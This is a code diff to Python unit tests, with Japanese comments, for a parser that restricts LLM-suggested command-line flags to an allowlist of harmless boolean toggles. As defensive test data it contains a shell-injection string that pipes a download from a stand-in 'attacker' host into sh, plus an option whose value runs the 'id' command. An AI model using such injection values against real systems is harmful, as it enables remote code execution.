@@ -43,8 +43,8 @@ def test_empty_and_non_dict_return_none():
 
 
 def test_flags_must_be_string_list():
-    out = _parse_setup_llm('{"checks": ["os"], "flags": [1, "--x", null]}', KNOWN)
-    assert out["flags"] == ["--x"]               # 非文字列を除去
+    out = _parse_setup_llm('{"checks": ["os"], "flags": [1, "--dom-xss", null]}', KNOWN)
+    assert out["flags"] == ["--dom-xss"]         # 非文字列を除去し許可リスト flag のみ残す
 
 
 def test_bool_depth_rejected():
@@ -53,10 +53,12 @@ def test_bool_depth_rejected():
     assert out["depth"] == 2
 
 
-def test_flags_allowlist_blocks_shell_injection():
-    # コピー可能コマンドへ連結されるため、シェル注入/空白入りオプションを排除（#170 P2）
+def test_flags_allowlist_only_safe_toggles():
+    # コピー可能コマンドへ連結されるため、明示許可リスト（無害な boolean トグル）のみ通す。
+    # 注入・値がシェル実行される option・任意の値付き option を排除（#170 P2）。
     out = _parse_setup_llm(
-        '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", "--depth 3", "--llm=claude"]}',
+        '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", '
+        '"--header-refresh-cmd=id", "--llm=claude", "--spa-crawl"]}',
         KNOWN,
     )
-    assert out["flags"] == ["--dom-xss", "--llm=claude"]  # 注入と空白入りは落とし、安全形のみ残す
+    assert out["flags"] == ["--dom-xss", "--spa-crawl"]  # 許可リスト外は全て落とす
